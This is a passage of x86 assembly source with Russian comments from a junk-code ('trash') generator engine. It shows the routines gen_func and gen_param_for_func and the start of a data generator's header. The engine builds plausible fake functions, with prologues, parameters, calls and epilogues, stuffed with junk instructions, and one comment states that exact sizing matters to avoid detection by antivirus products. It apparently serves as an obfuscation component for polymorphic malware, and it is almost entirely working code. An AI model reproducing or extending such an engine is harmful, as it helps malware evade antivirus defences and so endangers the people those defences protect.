;	что у нее нет вызовов - переходим на построение эпилогов func_3. И выходим. Теперь мы снова в func_2. 
;	Единственный ее вызов сгенерили - значит переходим на построение эпилогов func_2. И после вышли на func_1. 
;	У func_1 - остался еще один вызов - он будет на func_4. И генерим func_4. У func_4 - нет вызовов. И снова 
;	попадаем на func_1. У func_1 теперь сгенерены все 2 вызова - строим эпилог. На этом всё. 
;	В итоге, получиться может так:
;		func_4:
;			...
;			ret
;
;		func_3:
;			...
;			ret
;
;		func_1:
;			...
;			call	func_2
;			...
;			call	func_4
;			...
;			ret
;
;		func_2:
;			...
;			call	func_3
;			...
;			ret
;
;	В XTG_TRASH_GEN.ep_trash_addr - будет лежать адрес на func_1 - aka точка входа в трэш=)!; 
;	Также, каждая функа, может иметь, например, такую начинку: 
;	func_x:
;		push	ebp								;на данный момент постоянно генерится
;		mov		ebp, esp						;аналогично
;		sub		esp, 14h						;опционально - если есть локальные переменные, то будет. И в зависимости от их кол-ва, может быть другое значения от 14h; 
;		...										;трэш - тут же инициализация рега ecx; 
;		mov		dword ptr [ebp - 0Ch], ecx		;если локалы есть, тогда будет инициализация хотя бы одной локал-перем; 
;		...										;трэш
;		push	ebx								;входные параметры
;		push	dword ptr [ebp - 14h]			;
;		call	func_xx							;вызов функи
;		...										;трэш
;		leave									;эпилог 
;		ret										;выход
; 
;и многие другие варики;
; 	
;etc 
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код;   
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  
gf_struct1_addr		equ		dword ptr [ebp + 24h]						;XTG_TRASH_GEN
gf_struct2_addr		equ		dword ptr [ebp + 28h]						;XTG_EXT_TRASH_GEN 

gf_tmp_var1			equ		dword ptr [ebp - 04]						;вспомогательные переменные; 
gf_tmp_var2			equ		dword ptr [ebp - 08]
gf_tmp_var3			equ		dword ptr [ebp - 12]
gf_tmp_var4			equ		dword ptr [ebp - 16]

gf_xids_addr		equ		dword ptr [ebp - 20]						;XTG_INSTR_DATA_STRUCT 

gen_func:
	pushad
	mov		ebp, esp
	sub		esp, 24
	xor		ecx, ecx													;ecx сейчас будет собирать размер пролога + размер команды резервирования места в стеке под локальные переменные; 

;--------------------------------------------------------------------------------------------------------
	mov		ebx, gf_struct2_addr
	assume	ebx: ptr XTG_EXT_TRASH_GEN
	mov		ebx, [ebx].xlogic_struct_addr 
	assume	ebx: ptr XTG_LOGIC_STRUCT									;можно ли юзать логику?
	test	ebx, ebx
	je		_gf_fxidsa_
	mov		ebx, [ebx].xinstr_data_struct_addr
_gf_fxidsa_:
	mov		gf_xids_addr, ebx											;в этой переменной окажется адрес XTG_INSTR_DATA_STRUCT либо 0, если всё хуйня; 
;--------------------------------------------------------------------------------------------------------
	
	mov		ebx, gf_struct1_addr
	assume	ebx: ptr XTG_TRASH_GEN 										;ebx - адрес структуры XTG_TRASH_GEN 
	mov		esi, [ebx].xfunc_struct_addr 
	assume	esi: ptr XTG_FUNC_STRUCT									;esi - XTG_FUNC_CTRUCT
	mov		edi, [esi].func_addr										;edi - адрес, откуда начинать генерировать функу с её прологами, трэшем, эпилогами etc; 
	imul	eax, [esi].param_num, 04									;eax - кол-во входных параметров * 4 (4 байта - размер входного параметра); 
	mov		gf_tmp_var3, eax											;сохраним данное значение в gf_tmp_var3
	and		gf_tmp_var4, 0

	push	[ebx].tw_trash_addr											;сохраним в стэке нужные поля структуры;
	push	[ebx].trash_size
	push	[ebx].nobw 

	imul	edx, [esi].local_num, 04									;edx - кол-во локальных переменных * 4; 
	mov		al, 55h														;далее генерим пролог функи
	stosb																;push ebp
	mov		ax, 0EC8Bh													;mob ebp, esp
	stosw
	add		ecx, 03														;ecx = 3;
	test	edx, edx													;если edx == 0, тогда локальных переменных нет, а значит не будем резервировать в стеке место под локал. перем.; 
	je		_gf_nxt_1_ 
	cmp		edx, 80h													;иначе смотрим, сколько локал. переменных, если их кол-во * 4 >= 80h, тогда генерим команду выделения места с опкодом 81h, иначе 83h; 
	jge		_gf_sub_esp_81h_
_gf_sub_esp_83h_:														;sub esp, XXh (83h 0ECh XXh) (XXh < 80h); 
	mov		ax, 0EC83h
	stosw
	xchg	eax, edx 
	stosb																;длина данной команды = 3 байта; 
	add		ecx, 03														;ecx += 3; 
	jmp		_gf_nxt_1_
_gf_sub_esp_81h_:														;sub esp, XXXXXXXXh (81h 0ECh XXXXXXXXh) (XXXXXXXXh >= 80h); 
	mov		ax, 0EC81h
	stosw
	xchg	eax, edx
	stosd																;length = 6 bytes;
	add		ecx, 06														;ecx += 6; 

_gf_nxt_1_:	
	push	04															;далее получаем СЧ; 
	call	[ebx].rang_addr

	or		al, 01														;в резалте EAX = 1 или 3 - это размер эпилога (1 байт - leave; 3 bytes - mov esp,ebp  pop ebp); 
	mov		gf_tmp_var2, eax											;сохраним полученное значение в gf_tmp_var2; 
	cmp		gf_tmp_var3, 0												;имеет ли данная функа входные параметры? 
	je		_gf_nxt_2_													;если нет, тогда команда выхода (ret) будет иметь размер 1 байт (0C3h);  
	inc		eax															;если да, то 3 байта (ret XXh - 0C2h XXh 00h); 
	inc		eax
_gf_nxt_2_:
	inc		eax															;и добавим это число к eax'у - eax теперь хранит размер эпилога + размер команды выхода; 
	imul	edx, [esi].call_num, 05										;edx - содержит размер всех вызовов в данной функе (call XXXXXXXXh - размер 5 байтов (0E8h etc)); 
	add		edx, eax													;добавляем eax
	add		edx, ecx													;и ecx; 
																		;то есть нам нужно посчитать точное кол-во байтов, которые будут отведены под пролог, эпилог и т.п. команды;
																		;и всё это будет храниться в edx;
																		;это нужно для того, чтобы мы записали все байты [esi].func_size, выделенные для функции. Так как мы заранее уже вычислили точные адреса и размеры функций, иначе может быть косяк и палево для авэх; 
																		;и затем вычтем: [esi].func_size - edx = кол-во байт - это для трэша;
	imul	eax, [esi].call_num, (max_param_num * param_max_size)		;так...теперь узнаем размер всех входных параметров - так как мы их еще не сгенерировали, 
																		;поэтому берем максимально допустимое кол-во параметров, умножаем на максимальный размер одного параметра и умножаем полученное значение на кол-во вызовов; 
	add		edx, eax													;и добавляем к edx; 
	mov		eax, [esi].func_size										;eax равен размеру данной функи;
	sub		eax, edx													;и вычитаем размер "служебных" байтов;
	mov		gf_tmp_var1, eax											;сохраняем полученный размер в gf_tmp_var1; это число - суммарный размер трэша в данной функе; 

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;можно ли юзать логику? 
	je		_gfl_nxt_1_ 

	mov		ecx, gf_xids_addr											;если да, тогда проэмулим только что сгенеренный пролог нашей функи; 
	assume	ecx: ptr XTG_INSTR_DATA_STRUCT 
	mov		edx, [esi].func_addr
	mov		[ecx].instr_addr, edx										;адрес, где начали писать пролог
	mov		[ecx].instr_size, edi
	sub		[ecx].instr_size, edx										;размер = адрес для текущей записи - адрес начала пролога; 
	mov		[ecx].flags, XTG_ID_FUNC_PROLOG 
	
	mov		edx, gf_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	mov		edx, [edx].xlogic_struct_addr
	assume	edx: ptr XTG_LOGIC_STRUCT
	
	push	edx															;и вызовем функу пр0верки логики данной конструкции
	push	ebx
	call	let_main

	mov		edx, [edx].xlv_addr
	lea		edx, dword ptr [edx + (vl_lv_num + 01 + 01) * 4]			;а вот тут такая фича: здесь хранится число активных локальных переменных - то есть таких, которые используются в настоящее время. 
	push	dword ptr [edx]												;Каждая функа имеет свои локал-вары и входные параметры. Так вот, например, мы сейчас строим первую функу - здесь сейчас 0 активных локал-варов.
																		;затем перед генерацией вызова и генерацией следующей функи, допустим, у нас стало активных 5 локал-варов. 
																		;Затем, мы генерим вторую функу. Она тут сохранит число 5. Также, допустим, что вторая функа никого не вызывает и юзает новые локал-вары. Число активных л.в. = 7; то есть 5 + 2;
																		;затем мы сгенерили эпилог второй функи и перед выходом снова в первую функу мы восстанавливаем число активных л.в. = 5 - так как управление перешло снова на первую функу, то новые 2 л.в. от второй функи уже стали неактивными. И т.д.
																		;etc 
	push	[ecx].param_1
	or		[ecx].param_1, XTG_XIDS_CONSTR								;указываем, что дальше будет генерится мусор, принадлежащий (этой) конструкции
	and		[ecx].instr_addr, 0											;сбрасываем адрес в 0 - это нужно для того, чтобы дальше мы снова не проверили эту конструкцию по логике, а проверяли уже новые сгенеренные будущие команды
_gfl_nxt_1_:
;--------------------------------------------------------------------------------------------------------

	xor		ecx, ecx													;ecx - теперь как счётчик кол-ва сгенерированных вызовов фунок (call's); 
	mov		edx, [esi].call_num											;edx - кол-во вызовов других фунок в данной функе =)! 
	
	cmp		[esi].local_num, 0											;если кол-во локальных переменных = 0, тогда инициализация хотя бы одной локальной переменной точно не нужна xD; 
	je		_gf_not_init_local_
	
	push	[ebx].fmode													;сохраним в стеке поля структуры, так как щас будем их изменять; 
	push	[ebx].xmask1 
	push	[ebx].xmask2
	push	[esi].param_num												; 
		
	mov		eax, (trash_max_size - 06)									;получим СЧ - размер порции мусора; можем смело так делать, так как размера точно хватит, всё посчитано в gen_data_for_func; 
	call	get_rnd_num_1

	add		eax, 06														;чтобы постараться хотя бы проинициализировать какой-нить рег etc; 

	;mov		[ebx].xmask1, (XTG_ON_XMASK - XTG_CMOVXX___R32__R32 - XTG_BSWAP___R32 - XTG_THREE_BYTES_INSTR - XTG_PUSH_POP___R32___R32) ;
	;mov		[ebx].xmask2, XTG_OFF_XMASK 								;указываем, какую(ие) команду(ы) генерить; 
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0
 
	push	gf_struct2_addr
	push	ebx
	call	xtg_main													;вызываем трэшген рекурсивно

	mov		eax, [ebx].nobw												;eax = кол-во реально записанных байтов; 
	add		edi, eax													;скорректируем edi на адрес для дальнейшей записи мусора; 
	sub		gf_tmp_var1, eax 											;вычтем из суммарного размера трэша размер текущей порции мусора; 
 
    mov		[ebx].fmode, XTG_MASK										;ставим режим "маска", чтобы сгенерить определенную(ы) команду(ы); 
    mov		[esi].param_num, 0											;нам нужна инициализация только локал-перем, поэтому обнулим входные параметры функи; 
	mov		[ebx].xmask2, XTG_MOV___M32EBPO8__R32						;указываем, какую команду генерить; 
	mov		[ebx].xmask1, XTG_OFF_XMASK									;
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, 03										;etc; 
	and		[ebx].nobw, 0

;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT								;снова проверяем, можно ли юзать логику? 
	test	esi, esi
	je		_gf_g1stlv_
	and		[esi].instr_addr, 0											;перед каждой рекурсией сбрасываем данное поле в 0, чтобы далее проверялись на логику новые команды, а не снова эта конструкта и т.п.; 
_gf_g1stlv_:
	pop		esi 
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

	push	gf_struct2_addr
	push	ebx
	call	xtg_main													;вызываем трэшген рекурсивно 

	mov		eax, [ebx].nobw
	add		edi, eax													;снова корректируем значения;
	sub		gf_tmp_var1, eax 

	pop		[esi].param_num												;восстанавливаем поля структур; 
	pop		[ebx].xmask2
	pop		[ebx].xmask1
	pop		[ebx].fmode

_gf_not_init_local_:
_gf_nxt_2_1_:		
_gf_cycle_1_:															;теперь будем генерить call'ы в перемешку с трэшем; либо просто пачку мусора; 
	push	gf_tmp_var1													;получаем случайный размер очередной порции мусора; 
	call	[ebx].rang_addr
	
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0

;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	test	esi, esi													;снова проверяем, можно ли юзать логику? 
	je		_gf_t_
	and		[esi].instr_addr, 0											;перед каждой рекурсией сбрасываем данное поле в 0, чтобы далее проверялись на логику новые команды, а не снова эта конструкта и т.п.; 
_gf_t_:
	pop		esi 
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------
	
	push	gf_struct2_addr
	push	ebx
	call	xtg_main													;вызываем трэшген рекурсивно

	mov		eax, [ebx].nobw												;в EAX - число реально записанных (после рекурсии) байт (трэш);   
	add		edi, eax													;корректируем edi;
	sub		gf_tmp_var1, eax											;отнимаем от суммарного размера трэша размер текущей пачки мусорка; 
	cmp		ecx, edx													;теперь смотрим, есть ли в данной функе вызовы других функций? и если есть, то все ли мы записали? 
	jge		_gf_nxt_3_
	add		esi, sizeof (XTG_FUNC_STRUCT)								;если же вызовы есть и мы записали не все, то сделаем это!; перейдем к адресу следующей структуры XTG_FUNC_STRUCT, описывающей функу, на которую будем лепить вызов; 
	push	ecx
	xor		ecx, ecx
_gf_gen_init_param_:													;но перед генерацией вызова, сначала проверим, есть у функи, на которую будет вызов, входные параметры?

;--------------------------------------------------------------------------------------------------------
	push	esi
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	test	esi, esi													;снова проверяем, можно ли юзать логику? 
	je		_gf_p_nxt_1_
	mov		[esi].instr_addr, edi										;теперь подготовимся к проверке входного параметра - сохраним адрес будущей команды
	mov		[esi].flags, XTG_ID_FUNC_PARAM								;и укажем, что проверять будем параметр; 
_gf_p_nxt_1_:
	pop		esi 
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

	cmp		ecx, [esi].param_num
	jge		_gf_nxt_2_2_ 												;если есть, то сгенерируем их
	call	gen_param_for_func											;вызываем функу генерации входных параметров; 
	test	eax, eax													;если не получилось сгенерить параметр, пытаемся ещё раз; 
	je		_gf_gen_init_param_											;если же получилось, то в eax будет размер сгенеренной команды; 

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;снова проверяем, можно ли юзать логику? 
	je		_gf_p_nxt_2_
	push	esi
	push	edx
	push	eax
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	mov		edx, gf_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	mov		eax, [esi].instr_addr
	mov		[esi].instr_size, edi
	sub		[esi].instr_size, eax										;вычисляем размер только что сгенеренной команды

	push	[edx].xlogic_struct_addr
	push	ebx
	call	let_main													;и проверим, подходит ли данный параметр нам по логике?

	test	eax, eax
	pop		eax
	pop		edx
	jne		_gf_pn2e1_													;если проходит, тогда прыгаем дальше 
	mov		edi, [esi].instr_addr										;иначе откатимся назад и снова генерим параметр (подходящий полюбасу сгенерится); 
	pop		esi
	jmp		_gf_gen_init_param_
_gf_pn2e1_:
	pop		esi
_gf_p_nxt_2_:
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

	add		gf_tmp_var4, eax											;в gf_tmp_var4 хранится размер всех сгенеренных входных параметров (команд) в данной функе; 
	inc		ecx															;переходим к генерации следующего параметра; 
	jmp		_gf_gen_init_param_
_gf_nxt_2_2_:
	pop		ecx

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;снова проверяем, можно ли юзать логику? 
	je		_gf_c_
	push	esi
	push	edx
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	mov		edx, gf_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	mov		[esi].flags, XTG_ID_FUNC_CALL								;далее, указываем, что нам нужна (простая) эмуляций команды "call"; 

	push	[edx].xlogic_struct_addr
	push	ebx
	call	let_main

	pop		edx
	pop		esi

_gf_c_:
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

	mov		eax, [esi].func_addr										;eax - адрес новой функи, на которую будет вызов;
	sub		eax, edi													;отнимаем текущий адрес (это адрес, по которому сейчас будет сгенерирован call); 
	sub		eax, 05														;и отнимаем 5 (байтов) - это размер колла; 
	push	eax															;в eax у нас теперь относительный переход (rel32); 
	mov		al, 0E8h													;генерируем сам call; 
	stosb
	pop		eax
	stosd

	push	[ebx].xfunc_struct_addr										;сохраним в стеке адрес структуры, соотв-щей текущей генерируемой функе; 
	mov		[ebx].xfunc_struct_addr, esi								;запишем в данное поле адрес на следующую структуру, соотв-щую функе, на которую сейчас сгенерили переход; 

	push	gf_struct2_addr
	push	gf_struct1_addr
	call	gen_func													;и теперь вызываем рекурсивно gen_func - она будет строить функу, на которую сейчас был построен переход; 

	pop		[ebx].xfunc_struct_addr										;восстанавливаем адрес в данном поле; сохраняем/восстанавливаем данный адрес здесь для того, что он нам сейчас еще будет нужен;
																		;если же save/restore в начале gen_func, тогда при выходе из рекурсии будет измененный адрес, а нам нужен адрес, что был до вызова рекурсии...закрутил я тут предложеньеце =); 
	xchg	eax, esi													;esi - содержит адрес структуры XTG_FUNC_STRUCT, которая соотв-ет последней на данный момент сгенерированной рекурсивно функе; 
	inc		ecx															;переходим к генерации следующего вызова; 
	jmp		_gf_cycle_1_
_gf_not_calls_:
_gf_nxt_3_:
	imul	eax, edx, (max_param_num * param_max_size)					;ранее, мы вычитали данный максимальный размер, теперь мы его прибавим;
	add		gf_tmp_var1, eax
	mov		eax, gf_tmp_var4
	sub		gf_tmp_var1, eax											;но вычтем тот размер, который реально был записан; если же вызовов не было для данной функи, то и входных 
																		;параметров тоже не было, а значит эти прибавления/вычитания ничего не дадут, значение в gf_tmp_var1, будет сбалансированным;
																		;если же вызовы были, но для них не было входных параметров, то также все ок - всё сбалансировано теперь; 
	
	mov		eax, gf_tmp_var1											;eax - содержит размер оставшегося незаписанным мусора;
	mov		[ebx].tw_trash_addr, edi
	mov		[ebx].trash_size, eax	
	and		[ebx].nobw, 0

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;снова проверяем, можно ли юзать логику? 
	je		_gf_t2_
	push	esi
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	and		[esi].instr_addr, 0											;сбрасываем поле в 0;
	xor		[esi].param_1, XTG_XIDS_CONSTR ;							;и сбрасываем данный флаг, чтобы сгенерились точно все байты; 
	pop		esi

_gf_t2_:
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------
	
	push	gf_struct2_addr												;и запишем его; 
	push	ebx
	call	xtg_main													;вызываем трэшген рекурсивно

	add		edi, [ebx].nobw												;корректируем адрес для дальнейшей записи трэша; 

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;снова проверяем, можно ли юзать логику? 
	je		_gf_e_
	push	esi
	mov		esi, gf_xids_addr 											;подготовимся к эмулю эпилога функи
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	mov		[esi].instr_addr, edi										;сохраним адрес начала эпилога
	mov		[esi].flags, XTG_ID_FUNC_EPILOG								;и укажем спец. флагом, что будем эмулить эпилог
	pop		esi
_gf_e_:
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

_gf_epilog_:
	cmp		gf_tmp_var2, 01												;теперь сгенерируем эпилог
	jg		_gfe___mov__esp_ebp___pop__ebp_								;если ранее мы выбрали leave, то запишем его
_gfe_leave_:															;leave (1 byte)
	mov		al, 0C9h
	stosb
	jmp		_gf_nxt_4_
_gfe___mov__esp_ebp___pop__ebp_:										;иначе  
	mov		ax, 0E58Bh													;mov esp, ebp
	stosw																;pop ebp
	mov		al, 5Dh														;(3 bytes) 
	stosb
_gf_nxt_4_:
	cmp		gf_tmp_var3, 0												;далее, смотрим, есть для данной функи входные параметры?
	je		_gfe___ret_													;
_gfe___ret__XXh_: 														;если есть, тогда генерим ret XXh (XX = кол-во входных параметров * 4 (размер 1 входного параметра)); 
	mov		al, 0C2h													;
	stosb
	mov		eax, gf_tmp_var3
	stosw
	jmp		_gf_nxt_5_
_gfe___ret_:															;иначе просто ret; 
	mov		al, 0C3h
	stosb

_gf_nxt_5_:

;--------------------------------------------------------------------------------------------------------
	cmp		gf_xids_addr, 0												;снова проверяем, можно ли юзать логику? 
	je		_gf_ee_
	push	esi
	mov		esi, gf_xids_addr 
	assume	esi: ptr XTG_INSTR_DATA_STRUCT	
	mov		edx, [esi].instr_addr
	mov		[esi].instr_size, edi
	sub		[esi].instr_size, edx										;etc; вычислим размер эпилога
	mov		edx, gf_struct2_addr
	assume	edx: ptr XTG_EXT_TRASH_GEN
	mov		edx, [edx].xlogic_struct_addr								; 
	assume	edx: ptr XTG_LOGIC_STRUCT									;

	push	edx
	push	ebx
	call	let_main													;проэмулим его

	pop		eax															;eax = ранее сохранённое значение esi;
	pop		[esi].param_1												;восстановим данное поле
	mov		edx, [edx].xlv_addr
	lea		edx, dword ptr [edx + (vl_lv_num + 01 + 01) * 4]			;и восстановим число активных локальных переменных; 
	pop		dword ptr [edx]
	xchg	eax, esi													;esi теперь получает своё ранее сохранённое значение; 

_gf_ee_:
	assume	esi: ptr XTG_FUNC_STRUCT
;--------------------------------------------------------------------------------------------------------

	pop		[ebx].nobw													;восстанавливаем из стека ранее сохраненные поля; 
	pop		[ebx].trash_size
	pop		[ebx].tw_trash_addr

_gf_ret_:
	mov		dword ptr [ebp + 1Ch], esi									;сохраняем в eax адрес структуры XTG_FUNC_STRUCT, которая соотв-ет текущей генерируемой функе;
																		;это чтобы следующий вызов можно было сгенерить на функу, которой соотв-ет структура, лежащая по адресу в eax; 
	mov		esp, ebp
	popad
	ret		04 * 2														;выходим 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи gen_func 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx


 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa gen_param_for_func
;генерация входных параметров для функции
;ВХОД:
;	EBX						-	etc
;	[ebx].xfunc_struct_addr	-	адрес структуры XTG_FUNC_STRUCT;
;ВЫХОД:
;	EAX			-	0, если не получилось сгенерить, иначе в EAX лежит длина сгенерированной команды; 
;ЗАМЕТКИ:
;	Схема работы функи такая: в [ebx].xfunc_struct_addr мы передаем адрес структы XTG_FUNC_STRUCT. 
;	То есть если, например, мы сейчас в функе gen_func генерируем функу, которой соответствует 2-ая по 
;	счёту структура XTG_FUNC_STRUCT, тогда в [ebx].xfunc_struct_addr передаем адрес этой же структы. 
;	Так как входные параметры предназначены для 3-ей функи (3-ей структуры), но записываем их, конечно 
;	во 2-ой =)
;	Конкретный пример:
;		func_2:						;это наша 2-ая функа
;			...						;тут какой-то трэш валяется;
;			push	ecx				;в ней записываем вот такой, например, входной параметр для func_3
;			call	func_3			;вызываем функу 3
;			...						;
;		func_3:						;а вот это наша функа 3; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;PUSH	DWORD PTR [403008h]		etc (0FFh 35h XXXXXXXXh)
;PUSH	DWORD PTR [EBP - 14h]	etc (0FFh 75h XXh)
;PUSH	DWORD PTR [ebp + 14h]	etc (0FFh 75h XXh)
;PUSH	EAX						etc (5Xh)
;PUSH	05						etc (6Ah XXh)
;PUSH	123h					etc (68h XXXXXXXXh)
;etc
;!!!!! если захотелось генерить команды ещё и с moffs32, тогда добавить здесь нужный код;  
gen_param_for_func:

OFS_PARAM_PUSH_0FFh		equ		45
OFS_PARAM_PUSH_5Xh		equ		35
OFS_PARAM_PUSH_6Ah		equ		25
OFS_PARAM_PUSH_68h		equ		15 

	push	ecx															;сохраним в стеке данные реги; 
	push	esi

	mov		esi, [ebx].xfunc_struct_addr 
	assume	esi: ptr XTG_FUNC_STRUCT

	push	(OFS_PARAM_PUSH_0FFh + OFS_PARAM_PUSH_5Xh + OFS_PARAM_PUSH_6Ah + OFS_PARAM_PUSH_68h)
	call	[ebx].rang_addr

	cmp		eax, OFS_PARAM_PUSH_68h
	jl		_param_push_68h_
	cmp		eax, (OFS_PARAM_PUSH_68h + OFS_PARAM_PUSH_6Ah)
	jl		_param_push_6Ah_
	cmp		eax, (OFS_PARAM_PUSH_68h + OFS_PARAM_PUSH_6Ah + OFS_PARAM_PUSH_5Xh)
	jge		_param_push_0FFh_

_param_push_5Xh_:														;[PUSH REG32]
	call	get_rnd_r													;выберем случайный рег;

	add		al, 50h
	stosb																;opcode
	xor		eax, eax
	inc		eax															;length of instr = 1 byte; 
	jmp		_gpff_ret_

_param_push_0FFh_:														;[PUSH MEM32]; [PUSH DWORD PTR [EBP -+ offset8]]; 
	push	02
	call	[ebx].rang_addr

	test	eax, eax
	je		_pp0FFh_with_ebp_

_pp0FFh_mem32_:															;[PUSH MEM32]
	call	check_data													;проверим секцию данных на пригодность; 

	test	eax, eax
	je		_gpff_ret_													;если там какая-то хуйня, тогда выходим; 

	mov		ax, 035FFh
	stosw																;2 bytes;
		
	call	get_rnd_data_va												;получим случайный адрес в секции данных
	
	stosd																;offset; 4 bytes; 
	push	06															;length = 6 bytes;
	pop		eax 
	jmp		_gpff_ret_

_pp0FFh_with_ebp_:														;[PUSH DWORD PTR [EBP +- offset8]]; 
	push	02
	call	[ebx].rang_addr

	shl		eax, 02														;eax = либо 0 либо 4 (0 - для генерации входного параметра - локал. перем., иначе 4 - для вход. знач-я); 
	xchg	eax, ecx
	xor		eax, eax
	test	ecx, ecx
	je		_ebp_local_
_ebp_param_:															;[PUSH DWORD PTR [EBP + offset8]]; это если у нашей текущей функи есть входные параметры для их использования также в качестве входных параметров, но при вызове другой функи; 
	cmp		[esi].param_num, 0
	je		_gpff_ret_ 
	cmp		[esi].param_num, (80h / 04)									;если входных параметров >= данного значения, тогда по идее нужно генерировать команды с offset32, но мы пока просто выйдем; 
	jge		_gpff_ret_
	mov		ax, 75FFh													;2 bytes;
	stosw

	push	[esi].param_num												;случайно выберем, значение какого входного параметра будет передаваться в стек?; 
	call	[ebx].rang_addr

	inc		eax															;входной параметр однозначно будет; 
	imul	eax, eax, 04												;умножаем на 4, так как размер входного парам-ра = 4 байта (sizeof (dword)); 
	add		eax, ecx													;самый первый входной параметр будет начинаться у нас всегда с dword ptr [ebp + 08]; 
	jmp		_gpff_nxt_1_
_ebp_local_:															;[PUSH DWORD PTR [EBP - offset8]]; это если у функи есть локальные переменные; 
	cmp		[esi].local_num, 0
	je		_gpff_ret_
	cmp		[esi].local_num, (84h / 04)									;etc, но есть нюанс - push dword ptr [ebp - 80h] - 80h - это еще offset8, а 84h - уже offset32; 
	jge		_gpff_ret_
	mov		ax,75FFh													;2 bytes; 
	stosw

	push	[esi].local_num												;etc
	call	[ebx].rang_addr

	inc		eax 
	imul	eax, eax, 04
	add		eax, ecx
	neg		eax															;так как это локал. переменная, то инвертируем полученное значение; смотрим в сорцы, в отладчик и т.п.=)! 
_gpff_nxt_1_:
	stosb																;1 byte; 
	push	03															;length = 3 bytes;
	pop		eax
	jmp		_gpff_ret_
_param_push_6Ah_:														;[PUSH IMM8]
	mov		al, 06Ah
	stosb

	push	256
	pop		eax
	call	get_rnd_num_1 

	stosb
	push	02															;length = 2 bytes;
	pop		eax
	jmp		_gpff_ret_
_param_push_68h_: 														;[PUSH IMM32]
	mov		al, 68h
	stosb

	mov		eax, 1000h													;получим СЧ;
	call	get_rnd_num_1 

	add		eax, 80h													;IMM32 >= 80h
	stosd
	push	05															;длина команды = 5 байтов; 
	pop		eax
_gpff_ret_:	
	pop		esi															;восстанавливаем реги; 
	pop		ecx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи gen_param_for_func 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   







 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa xtg_data_gen
;генератор данных (строк, чисел);
;ВХОД (stdcall xtg_data_gen(DWORD xparam1, DWORD xparam2)):
;	xparam1			-	адрес структуры XTG_TRASH_GEN
;	xparam2			-	XTG_DATA_STRUCT
;ВЫХОД:
;	(+)				-	сгенерированные данные
;	(+)				-	заполненные выходные поля структуры XTG_DATA_STRUCT
;	EAX				-	размер (в байтах) реально сгенерированных данных; 
;ЗАМЕТКИ:
;	Возможна генерация случайных строк, чисел. 
;	Число: размер = 4 байта (32-х разрядное). Адрес числа кратен 4. 
;	Строка: max длина = 16 байт. Длина строки кратна 4 и выровнена нулями. Строка с нулём(ями) в конце. 
;	Адрес строки кратен 4. Генерируется ansi-строка. 
;	Число может быть таких видов:
;		
;		0x555
;		0x1234
;		etc
;
;	Строка может быть таких видов:
;
;		'123asHk'
;		'7Kjgh.txt'
;		'faq.exe'
;		'ahe.dll'
;		'a5789.m5p'
;		etc	
; 
;	Ещё: если изменить строку, чьи символы служат для генерации строк, и метод генерации этих данных
;	(строк/чисел), тогда предусмотреть изменения и в движке FAKA (и может еще, где нужно); 
